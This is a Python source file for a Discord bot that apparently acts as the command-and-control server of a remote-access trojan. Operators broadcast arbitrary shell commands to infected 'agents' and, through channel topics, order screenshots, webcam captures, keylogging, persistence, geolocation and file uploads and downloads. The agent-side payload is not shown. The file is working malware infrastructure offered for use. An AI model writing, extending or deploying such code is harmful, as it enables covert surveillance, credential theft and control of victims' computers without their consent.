import discord
from discord.ext import commands, tasks
import os
import asyncio
from aiohttp import web
from datetime import datetime, timezone, timedelta
import re

# Configuration from environment variables
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
PORT = int(os.getenv("PORT", 10000))

if not BOT_TOKEN or not GUILD_ID:
    raise ValueError("Missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID")

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

# HTTP health check server
async def handle_health(request):
    return web.Response(text="OK")

app = web.Application()
app.router.add_get("/", handle_health)
app.router.add_get("/health", handle_health)

async def start_http_server():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"HTTP health check server running on port {PORT}")

# Background task to clean stale agents
@tasks.loop(minutes=1)
async def clean_stale_agents():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        return

    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    now = datetime.now(timezone.utc)

    for channel in agent_channels:
        try:
            async for msg in channel.history(limit=10, oldest_first=True):
                if msg.author == bot.user and "**Last seen:**" in msg.content:
                    match = re.search(r"\*\*Last seen:\*\*\s*([^\n]+)", msg.content)
                    if not match:
                        await channel.delete()
                        break
                    timestamp_str = match.group(1).strip()
                    try:
                        last_seen = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
                        if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
                            print(f"Deleting {channel.name} (stale)")
                            await channel.delete()
                    except:
                        await channel.delete()
                    break
            else:
                await channel.delete()
        except:
            pass

@clean_stale_agents.before_loop
async def before_clean_stale_agents():
    await bot.wait_until_ready()

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild:
        control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
        if not control:
            await guild.create_text_channel(CONTROL_CHANNEL_NAME)
            print(f"Created #{CONTROL_CHANNEL_NAME} channel")
    clean_stale_agents.start()

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return
    await bot.process_commands(message)

# ---------- Control Channel Commands ----------
@bot.command(name="agents", help="List all active agents")
async def list_agents(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents currently connected.")
        return
    embed = discord.Embed(title="Active Agents", color=0x00ff00)
    for ch in agent_channels:
        async for msg in ch.history(limit=10):
            if msg.author == bot.user and "**Last seen:**" in msg.content:
                embed.add_field(name=f"#{ch.name}", value=msg.content[:200], inline=False)
                break
        else:
            embed.add_field(name=f"#{ch.name}", value="No heartbeat", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="broadcast", help="Send a command to all agents")
async def broadcast(ctx, *, command):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents to broadcast to.")
        return
    for ch in agent_channels:
        await ch.edit(topic=f"cmd:run {command}")
    await ctx.send(f"Broadcast command `{command}` to {len(agent_channels)} agents.")

@bot.command(name="killall", help="Kill all agents")
async def kill_all(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    for ch in agent_channels:
        await ch.edit(topic="cmd:kill")
    await ctx.send(f"Kill signal sent to {len(agent_channels)} agents.")

# ---------- Agent Channel Commands ----------
@bot.listen()
async def on_message(message):
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return
    if not message.channel.name.startswith(AGENT_CHANNEL_PREFIX):
        return

    content = message.content.strip()
    # Map user-friendly commands to internal topic commands
    if content.startswith("!run "):
        cmd = content[5:].strip()
        await message.channel.edit(topic=f"cmd:run {cmd}")
        await message.add_reaction("✅")
    elif content == "!screenshot":
        await message.channel.edit(topic="cmd:screenshot")
        await message.add_reaction("✅")
    elif content == "!webcam":
        await message.channel.edit(topic="cmd:webcam")
        await message.add_reaction("✅")
    elif content.startswith("!upload "):
        path = content[8:].strip()
        await message.channel.edit(topic=f"cmd:upload {path}")
        await message.add_reaction("✅")
    elif content.startswith("!download "):
        args = content[9:].strip()
        await message.channel.edit(topic=f"cmd:download {args}")
        await message.add_reaction("✅")
    elif content == "!persist":
        await message.channel.edit(topic="cmd:persist")
        await message.add_reaction("✅")
    elif content == "!geolocate":
        await message.channel.edit(topic="cmd:geolocate")
        await message.add_reaction("✅")
    elif content == "!keylog_start":
        await message.channel.edit(topic="cmd:keylog_start")
        await message.add_reaction("✅")
    elif content == "!keylog_stop":
        await message.channel.edit(topic="cmd:keylog_stop")
        await message.add_reaction("✅")
    elif content == "!kill":
        await message.channel.edit(topic="cmd:kill")
        await message.add_reaction("✅")
    else:
        # Not a command; ignore
        pass

# ---------- Main ----------
async def main():
    asyncio.create_task(start_http_server())
    await bot.start(BOT_TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
